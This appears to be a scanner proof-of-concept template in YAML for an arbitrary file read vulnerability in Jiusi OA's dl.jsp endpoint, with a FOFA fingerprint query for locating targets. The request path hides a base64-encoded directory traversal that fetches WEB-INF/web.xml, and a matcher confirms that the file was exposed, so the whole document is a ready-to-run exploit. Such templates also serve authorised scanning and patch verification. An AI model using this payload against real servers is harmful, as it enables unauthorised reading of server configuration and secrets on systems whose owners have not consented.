id: poc-yaml-jiusi-oa-jsoa-dl-fileread
info:
  name: 九思OA dl.jsp 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 九思OA
  fofa: app="九思软件-OA"
requests:
- method: GET
  path: /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h
  expression: "status_code == 200 && \n!contains(body,\"<html>\") &&\ncontains(body,\"\
    <param-value>\") &&\ncontains(body,\"<?xml version\") &&\ncontains(body,\"<servlet-name>\"\
    ) &&\nmatches(body, \"<filter-class>(.*)</filter-class>\") &&\nmatches(body, \"\
    <servlet-class>(.*)</servlet-class>\") &&\nmatches(body, \"/WEB-INF/(.*).xml\"\
    )\n"
variables: {}
transport: http
